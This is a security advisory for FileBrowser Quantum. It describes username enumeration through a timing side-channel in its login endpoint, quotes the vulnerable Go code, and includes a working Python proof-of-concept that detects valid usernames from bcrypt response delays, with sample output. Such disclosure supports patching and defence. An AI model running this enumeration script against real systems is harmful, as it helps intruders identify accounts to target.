# [M] FileBrowser Quantum has Username Enumeration via Authentication Timing Side-Channel

## Summary
Severity: Medium
Advisory: GHSA-7789-65hx-f26w
CVE: CVE-2026-54685
CWE: CWE-208
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-7789-65hx-f26w
Type: github-advisory

## Affected
- Go: `github.com/gtsteffaniak/filebrowser/backend` — affected >=0 <0.0.0-20260317230626-af08800667b8

## Details
### Summary

The `/api/auth/login` authentication endpoint does not execute in constant time. When a non-existent username is supplied, the server returns a `401`/`403` response almost immediately. When a valid username is provided, the server performs a bcrypt password comparison, causing a measurable delay in the response time.

### Details

The vulnerability exists in the `Auth` function of `JSONAuth` in `auth/json.go` (lines 45–52). The function performs a database lookup for the user prior to performing any password validation.

```go
user, err := userStore.Get(username)
	if err != nil {
		return nil, fmt.Errorf("unable to get user from store: %v", err)
	}
	err = users.CheckPwd(password, user.Password)
	if err != nil {
		return nil, err
	}
```

If the username is not found, the function returns an error immediately. If the username is found, the function calls `CheckPwd`, which executes the bcrypt hash comparison. Because bcrypt is intentionally computationally expensive, this introduces a measurable delay in the response time.

As a result, an attacker can distinguish valid usernames from invalid ones by measuring the authentication response times.

In testing, responses for valid usernames consistently required approximately 40–50 ms due to the bcrypt comparison, while invalid usernames returned in approximately 1–4 ms.

### PoC

The script below automates this attack by calibrating the network latency using non-existent usernames to establish a baseline and then testing a list of target users. Valid usernames are detected when the response time exceeds the baseline.

```python
import requests
import time
import statistics

# Configuration - adjust domain and wordlist as appropriate
TARGET_URL = "http://localhost/api/auth/login"
WORDLIST = ["admin", "root", "user2", "nonexistent_test_user"]

def measure(username):
    start = time.perf_counter()
    requests.post(TARGET_URL, params={"username": username}, headers={"X-Password": "wrong-password"})
    return time.perf_counter() - start

# 1. Baseline Calibration
print("[*] Calibrating...")
baselines = [measure(f"not_a_user_{i}") for i in range(20)]
threshold = statistics.mean(baselines) + (statistics.stdev(baselines) * 5)
print(f"[*] Baseline: {statistics.mean(baselines):.4f}s | Threshold: {threshold:.4f}s")

# 2. Validation Test
for user in WORDLIST:
    t = measure(user)
    status = "VALID" if t > threshold else "invalid"
    print(f"{user:<15} | {t:.4f}s | {status}")
```

Example output (with `admin` and `user2` configured as valid users in the application):

```
$ python timeattack.py
[*] Calibrating...
[*] Baseline: 0.0041s | Threshold: 0.0256s
admin           | 0.0505s | VALID
root            | 0.0019s | invalid
user2           | 0.0464s | VALID
nonexistent_test_user | 0.0015s | invalid
```

### Impact

An unauthenticated attacker can enumerate valid usernames by measuring authentication response times.

## References
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-7789-65hx-f26w
- https://github.com/gtsteffaniak/filebrowser/commit/af08800667b874620edc6f44c3e2e64fec7abd85
- https://github.com/gtsteffaniak/filebrowser
- https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.3.2-beta
